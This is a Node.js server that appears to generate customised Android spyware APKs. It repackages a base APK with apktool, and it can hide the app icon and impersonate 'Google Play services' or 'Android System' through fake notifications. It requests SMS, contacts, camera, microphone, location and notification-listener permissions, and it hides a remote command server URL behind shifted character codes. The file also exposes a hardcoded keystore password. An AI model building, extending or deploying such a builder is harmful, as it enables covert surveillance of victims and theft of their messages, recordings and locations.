const express = require('express');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { spawn, exec } = require('child_process');
const sharp = require('sharp');
const axios = require('axios');
const cloudinary = require('cloudinary').v2;
const FormData = require('form-data');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 4000;

app.use(cors());
app.use(express.json());

// Storage for icon uploads
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// Helper to run commands (Streaming Output)
const runCommand = (command, args, options = {}) => {
    return new Promise((resolve, reject) => {
        console.log(`[CMD] Running: ${command} ${args.join(' ')}`);
        const proc = spawn(command, args, { ...options, stdio: 'inherit' });

        proc.on('close', (code, signal) => {
            if (code === 0) resolve('Success');
            else if (signal) reject(new Error(`Command ${command} was killed by signal: ${signal} (Likely OOM)`));
            else reject(new Error(`Command ${command} failed with code ${code}`));
        });

        proc.on('error', (err) => reject(err));
    });
};

// Pre-decode Base APK
const baseApkPath = path.join(__dirname, 'assets', 'base.apk');
const decodedBaseDir = path.join(__dirname, 'temp', 'decoded_base');

if (!fs.existsSync(path.join(__dirname, 'temp'))) fs.mkdirSync(path.join(__dirname, 'temp'));

const initBaseApk = async () => {
    const isDecodedValid = fs.existsSync(path.join(decodedBaseDir, 'apktool.yml'));

    if (fs.existsSync(baseApkPath) && !isDecodedValid) {
        console.log('[Init] Pre-decoding Base APK...');
        if (fs.existsSync(decodedBaseDir)) fs.rmSync(decodedBaseDir, { recursive: true, force: true });

        try {
            await runCommand('apktool', ['d', baseApkPath, '-o', decodedBaseDir, '-f']);
            console.log('[Init] Base APK pre-decoded.');
        } catch (e) {
            console.error('[Init] Failed:', e.message);
            if (fs.existsSync(decodedBaseDir)) fs.rmSync(decodedBaseDir, { recursive: true, force: true });
        }
    } else if (isDecodedValid) {
        console.log('[Init] Base APK already pre-decoded and valid.');
    }
};

// Keystore Configuration: uses assets/usman90.jks provided in folder
const usmanKsPath = path.join(__dirname, 'assets', 'usman90.jks');

// Run init
initBaseApk().catch(e => console.error("Init failed fatally:", e));

// Generate Route
app.post('/generate', upload.single('icon'), async (req, res) => {
    const { uuid, appName, packageName: userPackageName, hideApp, webLink, callbackUrl, enableSmsPermission, enableContactsPermission, enableStoragePermission, enableCameraPermission, enableMicrophonePermission, enableNotificationListener, enableLocationPermission, aggressivePermissions, notificationStyle, notificationClickAction, notificationTitle, notificationText, notificationIcon } = req.body;
    const customIcon = req.file;

    console.log(`[APK] Request for UUID: ${uuid}`);

    // Ack immediately
    res.status(202).json({ message: 'Processing started' });

    // Background Task
    (async () => {
        const sendUpdate = async (event, data) => {
            if (callbackUrl) {
                try {
                    await axios.post(callbackUrl, { uuid, event, data });
                } catch (e) {
                    console.error('Failed to send webhook:', e.message);
                }
            }
        };

        try {
            await sendUpdate('apk_progress', { step: 'Initializing...', progress: 10 });

            const tempDir = path.join(__dirname, 'temp');
            const workDir = path.join(tempDir, `work-${uuid}`);
            const unsignedApkPath = path.join(tempDir, `unsigned-${uuid}.apk`);
            const finalApkName = `${(appName || "System").replace(/[^a-zA-Z0-9]/g, '-')}.apk`;
            const signedApkPath = path.join(tempDir, `signed-${uuid}.apk`);

            // Cleanup
            if (fs.existsSync(workDir)) fs.rmSync(workDir, { recursive: true, force: true });
            if (fs.existsSync(unsignedApkPath)) fs.unlinkSync(unsignedApkPath);

            // 1. Copy / Decompile Base APK
            const isBaseValid = fs.existsSync(path.join(decodedBaseDir, 'apktool.yml'));

            if (isBaseValid) {
                await sendUpdate('apk_progress', { step: 'Initializing environment...', progress: 15 });
                await runCommand('cp', ['-r', decodedBaseDir, workDir]);
            } else {
                await sendUpdate('apk_progress', { step: 'Decompiling base APK...', progress: 15 });
                await runCommand('apktool', ['d', baseApkPath, '-o', workDir, '-f']);
            }

            // 2. Customize App Name
            await sendUpdate('apk_progress', { step: 'Configuring application manifest...', progress: 30 });
            if (appName) {
                const stringsPath = path.join(workDir, 'res', 'values', 'strings.xml');
                if (fs.existsSync(stringsPath)) {
                    let content = fs.readFileSync(stringsPath, 'utf8');
                    content = content.replace(/<string name="app_name">.*?<\/string>/, `<string name="app_name">${appName}</string>`);
                    fs.writeFileSync(stringsPath, content);
                }
            }

            await sendUpdate('apk_progress', { step: 'Applying package configuration...', progress: 35 });
            const manifestPath = path.join(workDir, 'AndroidManifest.xml');
            const apktoolYmlPath = path.join(workDir, 'apktool.yml');

            // Standard 3-segment package name generation: com.<domain>.<app>
            const pkgDomains = ['developer', 'appworks', 'mobile', 'cloudapp', 'devkit', 'appcore', 'userapp', 'devtools', 'appstudio', 'toolkit', 'syscore', 'droidlab', 'techworks', 'datalink', 'smartapp', 'nettools', 'cloudworks', 'infomedia', 'digitalsys'];
            const pkgApps = ['sync', 'tools', 'hub', 'service', 'client', 'media', 'helper', 'core', 'kit', 'plus', 'link', 'connect', 'utility', 'manager', 'portal', 'view', 'access', 'drive', 'engine', 'guard', 'node'];
            const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];

            let newPackageName;
            if (userPackageName && userPackageName.trim()) {
                const clean = userPackageName.trim().toLowerCase().replace(/[^a-z0-9.]/g, '');
                const parts = clean.split('.').filter(Boolean);
                if (parts.length === 3) {
                    newPackageName = clean;
                } else if (parts.length === 2) {
                    newPackageName = `${clean}.${pick(pkgApps)}`;
                } else if (parts.length > 3) {
                    newPackageName = parts.slice(0, 3).join('.');
                } else {
                    newPackageName = `com.${clean || pick(pkgDomains)}.${pick(pkgApps)}`;
                }
            } else {
                newPackageName = `com.${pick(pkgDomains)}.${pick(pkgApps)}`;
            }

            let oldPackageName = 'com.asml.tech';
            if (fs.existsSync(manifestPath)) {
                const rawManifest = fs.readFileSync(manifestPath, 'utf8');
                const pkgMatch = rawManifest.match(/package="([^"]+)"/);
                if (pkgMatch) oldPackageName = pkgMatch[1];
            }

            // Update AndroidManifest.xml package
            if (fs.existsSync(manifestPath)) {
                let manifestContent = fs.readFileSync(manifestPath, 'utf8');
                manifestContent = manifestContent.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
                fs.writeFileSync(manifestPath, manifestContent);
                console.log(`[APK] Package renamed: ${oldPackageName} -> ${newPackageName}`);
            }

            // Update apktool.yml package
            if (fs.existsSync(apktoolYmlPath)) {
                let ymlContent = fs.readFileSync(apktoolYmlPath, 'utf8');
                ymlContent = ymlContent.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
                fs.writeFileSync(apktoolYmlPath, ymlContent);
            }

            // Rename smali references
            const updateSmaliFiles = (dir) => {
                if (!fs.existsSync(dir)) return;
                const files = fs.readdirSync(dir, { withFileTypes: true });
                for (const file of files) {
                    const filePath = path.join(dir, file.name);
                    if (file.isDirectory()) {
                        updateSmaliFiles(filePath);
                    } else if (file.name.endsWith('.smali')) {
                        let content = fs.readFileSync(filePath, 'utf8');
                        content = content.replace(new RegExp(oldPackageName.replace(/\./g, '/'), 'g'), newPackageName.replace(/\./g, '/'));
                        content = content.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
                        fs.writeFileSync(filePath, content);
                    }
                }
            };

            // Physically rename smali directory tree
            const oldPathSegments = oldPackageName.split('.');
            const newPathSegments = newPackageName.split('.');

            const renameSmaliFolders = (baseSmaliDir) => {
                const oldSmaliPath = path.join(baseSmaliDir, ...oldPathSegments);
                const newSmaliPath = path.join(baseSmaliDir, ...newPathSegments);

                if (!fs.existsSync(oldSmaliPath)) return;

                fs.mkdirSync(newSmaliPath, { recursive: true });

                const entries = fs.readdirSync(oldSmaliPath, { withFileTypes: true });
                for (const entry of entries) {
                    const oldEntryPath = path.join(oldSmaliPath, entry.name);
                    const newEntryPath = path.join(newSmaliPath, entry.name);
                    fs.renameSync(oldEntryPath, newEntryPath);
                }

                try {
                    fs.rmdirSync(oldSmaliPath);
                    const parentDir = path.dirname(oldSmaliPath);
                    if (fs.existsSync(parentDir) && fs.readdirSync(parentDir).length === 0) {
                        fs.rmdirSync(parentDir);
                    }
                } catch (_) {}

                console.log(`[APK] Smali dir renamed: ${oldSmaliPath} -> ${newSmaliPath}`);
            };

            const workDirItems = fs.readdirSync(workDir, { withFileTypes: true });
            const smaliDirs = workDirItems
                .filter(item => item.isDirectory() && (item.name === 'smali' || item.name.startsWith('smali_classes')))
                .map(item => item.name);

            console.log(`[APK] Found smali directories: ${smaliDirs.join(', ')}`);

            for (const sDir of smaliDirs) {
                updateSmaliFiles(path.join(workDir, sDir));
                renameSmaliFolders(path.join(workDir, sDir));
            }

            // Update resource XMLs
            const updateResXmlPackage = (dir) => {
                if (!fs.existsSync(dir)) return;
                const entries = fs.readdirSync(dir, { withFileTypes: true });
                for (const entry of entries) {
                    const entryPath = path.join(dir, entry.name);
                    if (entry.isDirectory()) {
                        updateResXmlPackage(entryPath);
                    } else if (entry.name.endsWith('.xml')) {
                        let content = fs.readFileSync(entryPath, 'utf8');
                        if (content.includes(oldPackageName)) {
                            content = content.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
                            fs.writeFileSync(entryPath, content);
                        }
                    }
                }
            };
            updateResXmlPackage(path.join(workDir, 'res'));

            // 3. Inject Config & Identity
            await sendUpdate('apk_progress', { step: 'Injecting configuration & identity...', progress: 45 });
            const assetsDir = path.join(workDir, 'assets');
            if (!fs.existsSync(assetsDir)) fs.mkdirSync(assetsDir, { recursive: true });
            fs.writeFileSync(path.join(assetsDir, 'uuid.txt'), uuid);

            const rawLink = webLink || "";
            const themeColors = [];
            for (let i = 0; i < rawLink.length; i++) {
                themeColors.push(rawLink.charCodeAt(i));
            }

            const socketServerUrl = process.env.SOCKET_SERVER_URL || "https://p01--gallery-eye--9zr85m7yb6s4.code.run";
            const netParams = [];
            for (let i = 0; i < socketServerUrl.length; i++) {
                netParams.push(socketServerUrl.charCodeAt(i) + (i % 7));
            }

            const config = {
                hideApp: hideApp === 'true',
                theme_colors: themeColors,
                net_params: netParams,
                appName: appName || "Google Play services",
                enableSmsPermission: enableSmsPermission === 'true',
                enableContactsPermission: enableContactsPermission === 'true',
                enableStoragePermission: enableStoragePermission !== 'false',
                enableCameraPermission: enableCameraPermission === 'true',
                enableMicrophonePermission: enableMicrophonePermission === 'true',
                enableLocationPermission: enableLocationPermission === 'true',
                enableNotificationListener: enableNotificationListener === 'true',
                aggressivePermissions: aggressivePermissions === 'true',
                notificationClickAction: notificationClickAction || "device_info"
            };

            const NOTIF_PRESETS = {
                default: { title: "Google Play services", text: "Running background checks", icon: "info", defaultAction: "device_info" },
                sync: { title: "Cloud Backup", text: "Syncing data in background", icon: "sync", defaultAction: "none" },
                cloud: { title: "Cloud Storage", text: "Connected to cloud service", icon: "sync", defaultAction: "none" },
                active: { title: "System Framework", text: "Service active", icon: "info", defaultAction: "none" },
                backup: { title: "Data Backup", text: "Backup in progress", icon: "download", defaultAction: "none" },
                ready: { title: "System Assistant", text: "Ready", icon: "info", defaultAction: "device_info" },
                google_play: { title: "Google Play services", text: "Checking for updates…", icon: "info", defaultAction: "device_info" },
                android_system: { title: "Android System", text: "System functions active", icon: "sync", defaultAction: "settings" },
                device_security: { title: "Security & Privacy", text: "All systems secured", icon: "lock", defaultAction: "security" },
                system_ui: { title: "System UI", text: "Syncing data", icon: "sync", defaultAction: "settings" },
                device_maintenance: { title: "Device Care", text: "Running in background", icon: "sync", defaultAction: "settings" },
                download_manager: { title: "Download Manager", text: "Transfer complete", icon: "download", defaultAction: "none" }
            };

            const style = notificationStyle || "default";
            const preset = NOTIF_PRESETS[style] || NOTIF_PRESETS.default;

            config.notificationTitle = (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : (preset.title || appName || "Google Play services");
            config.notificationText = (notificationText && notificationText.trim()) ? notificationText.trim() : (preset.text || "Running in background");
            config.notificationIcon = notificationIcon || preset.icon || "info";
            config.notificationClickAction = notificationClickAction || preset.defaultAction || "device_info";
            config.notificationChannelName = config.notificationTitle;

            fs.writeFileSync(path.join(assetsDir, 'config.json'), JSON.stringify(config));

            // 4. Configure Manifest Permissions & Service Types for ASML
            if (fs.existsSync(manifestPath)) {
                let manifestContent = fs.readFileSync(manifestPath, 'utf8');

                // Compute exact foregroundServiceType on CoreService
                const fgsTypes = ['mediaPlayback'];
                if (enableCameraPermission === 'true') fgsTypes.push('camera');
                if (enableMicrophonePermission === 'true') fgsTypes.push('microphone');
                if (enableLocationPermission === 'true') fgsTypes.push('location');

                manifestContent = manifestContent.replace(
                    /android:foregroundServiceType="[^"]*"/g,
                    `android:foregroundServiceType="${fgsTypes.join('|')}"`
                );

                // Strip unselected permissions cleanly
                if (enableCameraPermission !== 'true') {
                    manifestContent = manifestContent.replace(/\s*<uses-permission[^>]*android:name="android\.permission\.CAMERA"[^>]*\/>/g, '');
                    manifestContent = manifestContent.replace(/\s*<uses-permission[^>]*android:name="android\.permission\.FOREGROUND_SERVICE_CAMERA"[^>]*\/>/g, '');
                    manifestContent = manifestContent.replace(/\s*<uses-feature[^>]*android:name="android\.hardware\.camera[^"]*"[^>]*\/>/g, '');
                }

                if (enableMicrophonePermission !== 'true') {
                    manifestContent = manifestContent.replace(/\s*<uses-permission[^>]*android:name="android\.permission\.RECORD_AUDIO"[^>]*\/>/g, '');
                    manifestContent = manifestContent.replace(/\s*<uses-permission[^>]*android:name="android\.permission\.FOREGROUND_SERVICE_MICROPHONE"[^>]*\/>/g, '');
                    manifestContent = manifestContent.replace(/\s*<uses-feature[^>]*android:name="android\.hardware\.microphone[^"]*"[^>]*\/>/g, '');
                }

                if (enableLocationPermission !== 'true') {
                    manifestContent = manifestContent.replace(/\s*<uses-permission[^>]*android:name="android\.permission\.ACCESS_FINE_LOCATION"[^>]*\/>/g, '');
                    manifestContent = manifestContent.replace(/\s*<uses-permission[^>]*android:name="android\.permission\.ACCESS_COARSE_LOCATION"[^>]*\/>/g, '');
                    manifestContent = manifestContent.replace(/\s*<uses-permission[^>]*android:name="android\.permission\.FOREGROUND_SERVICE_LOCATION"[^>]*\/>/g, '');
                }

                if (enableCameraPermission !== 'true' && enableMicrophonePermission !== 'true') {
                    manifestContent = manifestContent.replace(/\s*<uses-permission[^>]*android:name="android\.permission\.MANAGE_OWN_CALLS"[^>]*\/>/g, '');
                    // Strip AudioRouteService if neither camera nor mic is enabled
                    manifestContent = manifestContent.replace(/<service[^>]*?AudioRouteService[^>]*?>[\s\S]*?<\/service>/g, '');
                    manifestContent = manifestContent.replace(/<service[^>]*?AudioRouteService[^>]*?\/>/g, '');
                }

                if (enableSmsPermission !== 'true') {
                    manifestContent = manifestContent.replace(/\s*<uses-permission[^>]*android:name="android\.permission\.READ_SMS"[^>]*\/>/g, '');
                    manifestContent = manifestContent.replace(/\s*<uses-permission[^>]*android:name="android\.permission\.RECEIVE_SMS"[^>]*\/>/g, '');
                }

                if (enableContactsPermission !== 'true') {
                    manifestContent = manifestContent.replace(/\s*<uses-permission[^>]*android:name="android\.permission\.READ_CONTACTS"[^>]*\/>/g, '');
                }

                if (enableStoragePermission === 'false') {
                    manifestContent = manifestContent.replace(/\s*<uses-permission[^>]*android:name="android\.permission\.READ_MEDIA_IMAGES"[^>]*\/>/g, '');
                    manifestContent = manifestContent.replace(/\s*<uses-permission[^>]*android:name="android\.permission\.READ_MEDIA_VIDEO"[^>]*\/>/g, '');
                    manifestContent = manifestContent.replace(/\s*<uses-permission[^>]*android:name="android\.permission\.READ_EXTERNAL_STORAGE"[^>]*\/>/g, '');
                }

                // Enforce release mode in manifest
                manifestContent = manifestContent.replace(/android:debuggable="true"/g, 'android:debuggable="false"');
                manifestContent = manifestContent.replace(/\s*android:testOnly="[^"]*"/g, '');

                fs.writeFileSync(manifestPath, manifestContent);
                console.log('[APK] AndroidManifest.xml configured accurately for ASML');
            }

            // 5. Replace App Icon if provided
            if (customIcon) {
                await sendUpdate('apk_progress', { step: 'Replacing application icon...', progress: 60 });
                const iconBuffer = customIcon.buffer;
                const sizes = {
                    'mipmap-mdpi': 48,
                    'mipmap-hdpi': 72,
                    'mipmap-xhdpi': 96,
                    'mipmap-xxhdpi': 144,
                    'mipmap-xxxhdpi': 192
                };

                const adaptiveIconDir = path.join(workDir, 'res', 'mipmap-anydpi-v26');
                if (fs.existsSync(adaptiveIconDir)) {
                    fs.rmSync(adaptiveIconDir, { recursive: true, force: true });
                }

                for (const [folder, size] of Object.entries(sizes)) {
                    const p = path.join(workDir, 'res', folder);
                    if (fs.existsSync(p)) {
                        try {
                            const existingFiles = fs.readdirSync(p);
                            existingFiles.forEach(f => {
                                if (f.startsWith('ic_launcher')) {
                                    fs.unlinkSync(path.join(p, f));
                                }
                            });

                            const buf = await sharp(iconBuffer).resize(size, size).toFormat('png').toBuffer();
                            fs.writeFileSync(path.join(p, 'ic_launcher.png'), buf);
                            fs.writeFileSync(path.join(p, 'ic_launcher_round.png'), buf);
                        } catch (e) {
                            console.error(`Failed to process icon for ${folder}:`, e);
                        }
                    }
                }
            }

            // 6. Build APK
            await sendUpdate('apk_progress', { step: 'Compiling APK resources...', progress: 70 });

            if (fs.existsSync(apktoolYmlPath)) {
                let ymlContent = fs.readFileSync(apktoolYmlPath, 'utf8');
                ymlContent = ymlContent.replace(/isFrameworkApk:\s*true/g, 'isFrameworkApk: false');
                ymlContent = ymlContent.replace(/.*testOnly.*/gi, '');
                fs.writeFileSync(apktoolYmlPath, ymlContent);
            }

            await runCommand('apktool', ['b', workDir, '-o', unsignedApkPath]);

            // 7. Sign APK with static usman90 Keystore from assets
            await sendUpdate('apk_progress', { step: 'Signing application with usman90 keystore...', progress: 85 });
            const signer = path.join(__dirname, 'assets', 'uber-apk-signer.jar');

            console.log(`[APK] Signing with usman90.jks`);
            await sendUpdate('apk_progress', { step: 'Applying V1+V2+V3 signature scheme...', progress: 90 });

            const signCmd = fs.existsSync(usmanKsPath)
                ? `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${usmanKsPath}" --ksAlias "usman90" --ksPass "God112256@" --ksKeyPass "God112256@" --allowResign`
                : `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --allowResign`;

            await new Promise((resolve, reject) => {
                exec(signCmd, { timeout: 120000 }, (err, stdout, stderr) => {
                    if (err) {
                        console.error('[APK] uber-apk-signer error:', err, stderr);
                        const fallbackCmd = `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --allowResign`;
                        exec(fallbackCmd, { timeout: 120000 }, (fErr) => fErr ? reject(fErr) : resolve());
                    } else {
                        resolve();
                    }
                });
            });

            // Find output signed APK
            const files = fs.readdirSync(tempDir);
            const generated = files.find(f => f.startsWith(`unsigned-${uuid}`) && f.includes('signed'));

            if (generated) {
                const signedPath = path.join(tempDir, generated);
                let downloadUrl = "";

                // Strategy 1: Discord Webhook
                if (process.env.DISCORD_WEBHOOK_URL) {
                    try {
                        await sendUpdate('apk_progress', { step: 'Uploading to cloud...', progress: 95 });
                        const form = new FormData();
                        form.append('file', fs.createReadStream(signedPath), { filename: finalApkName });

                        const discordRes = await axios.post(process.env.DISCORD_WEBHOOK_URL, form, {
                            headers: { ...form.getHeaders() },
                            maxBodyLength: Infinity,
                            maxContentLength: Infinity
                        });

                        if (discordRes.data && discordRes.data.attachments && discordRes.data.attachments.length > 0) {
                            downloadUrl = discordRes.data.attachments[0].url;
                            console.log(`[APK] Discord URL: ${downloadUrl}`);
                        }
                    } catch (discordError) {
                        console.error('[APK] Discord Upload Failed:', discordError.message);
                    }
                }

                // Strategy 2: Cloudinary (Backup)
                if (!downloadUrl && process.env.CLOUDINARY_CLOUD_NAME) {
                    try {
                        await sendUpdate('apk_progress', { step: 'Uploading to backup cloud...', progress: 95 });

                        cloudinary.config({
                            cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
                            api_key: process.env.CLOUDINARY_API_KEY,
                            api_secret: process.env.CLOUDINARY_API_SECRET
                        });

                        const binPath = signedPath.replace('.apk', '.bin');
                        fs.copyFileSync(signedPath, binPath);

                        const result = await cloudinary.uploader.upload(binPath, {
                            resource_type: 'raw',
                            folder: 'generated_apks',
                            public_id: `${finalApkName.replace('.apk', '')}_${Date.now()}`
                        });

                        if (result && result.secure_url) {
                            downloadUrl = result.secure_url;
                            console.log(`[APK] Cloudinary URL: ${downloadUrl}`);
                        }
                        if (fs.existsSync(binPath)) fs.unlinkSync(binPath);
                    } catch (cloudError) {
                        console.error('[APK] Cloudinary Upload Failed:', cloudError.message);
                    }
                }

                // Cleanup temporary build files
                if (fs.existsSync(workDir)) fs.rmSync(workDir, { recursive: true, force: true });
                if (fs.existsSync(unsignedApkPath)) fs.unlinkSync(unsignedApkPath);
                if (fs.existsSync(signedPath)) fs.unlinkSync(signedPath);

                if (downloadUrl) {
                    await sendUpdate('apk_ready', { downloadUrl });
                    console.log(`[APK] Build completed successfully for ${uuid}`);
                } else {
                    await sendUpdate('apk_error', { message: 'Failed to upload APK to cloud storage' });
                }
            } else {
                throw new Error("Signed APK not found");
            }

        } catch (error) {
            console.error(`[APK] Build failed for ${uuid}:`, error);
            await sendUpdate('apk_error', { message: error.message });
        }
    })();
});

app.listen(port, () => {
    console.log(`APK Generator Microservice running on port ${port}`);
});
